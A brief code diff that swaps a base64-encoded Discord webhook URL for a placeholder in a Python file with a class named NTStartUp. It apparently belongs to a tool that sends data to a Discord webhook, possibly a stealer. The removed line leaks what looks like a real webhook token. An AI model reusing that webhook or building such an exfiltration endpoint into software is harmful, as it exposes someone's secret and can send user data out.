@@ -10,7 +10,7 @@ import shutil
 from discord import Embed
 
 
-WEBHOOK_64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEzODc4NzMzMTIxNDY5MjQ2My9RM1VtbVh6RFZCMndnMExkelEyMklneGhJM1JIdlo3bXU0cHVZWXMxeElacTlnd3FsZUpiMHI3TlNkUWVNa0lIZXFqaA=="
+WEBHOOK_64 = "Your_Encrypted_Webhook_Here"
 SECRET = base64.b64decode(WEBHOOK_64).decode()
 
 class NTStartUp:
